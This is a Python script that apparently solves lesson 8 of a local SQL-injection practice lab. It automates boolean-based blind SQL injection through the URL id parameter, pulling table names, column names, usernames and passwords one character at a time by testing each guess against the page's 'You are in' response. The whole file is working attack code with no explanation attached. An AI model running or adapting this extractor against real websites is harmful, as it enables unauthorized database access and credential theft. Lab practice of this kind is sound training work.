#less-8
import requests
import string
import urllib.parse
import time
alphabet = list(string.ascii_lowercase)
alphabet.append(',')
num=['1', '2','3', '4', '5', '6', '7', '8', '9']
alphabet.extend(num)
lst = list(range(1,200))
#url='http://localhost:1234/Less-8/'
word=""
tables=""
columns=""
password=""
for i in lst:
    for j in alphabet: 
        uwe = f"http://localhost:1234/Less-8/?id=1' AND (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),{i},1)) %3d '{j}' --+"
        w = requests.get(uwe )
        print(w.url)
        if 'You are in...........' in w.text :
            tables=tables+j
print(tables)



for i  in lst:
    for j in alphabet: 
        we = f"http://localhost:1234/Less-8/?id=1' AND (substr((select group_concat(column_name) from information_schema.columns where table_name='emails' limit 0,1),{i},1)) %3d '{j}' --+" 
        s = requests.get(we )
        print(s.url)
        if 'You are in...........' in s.text :
            columns=columns+j
          
            
             


for i  in lst:
    for j in alphabet: 
        rl = f"http://localhost:1234/Less-8/?id=1' AND (substr((select group_concat(username) from users limit 0,1),{i},1)) %3d '{j}' --+"
        r = requests.get(rl )
        print(r.url)
        if 'You are in...........' in r.text :
            word=word+j
           
            
for i  in lst:
    for j in alphabet: 
        drl = f"http://localhost:1234/Less-8/?id=1' AND (substr((select group_concat(password) from users limit 0,1),{i},1)) %3d '{j}' --+"
        qa= requests.get(drl )
        print(qa.url)
        if 'You are in...........' in qa.text :
            password=password+j
     
            




            
            
print(tables)            
print(word)               
print(password)
print(columns)












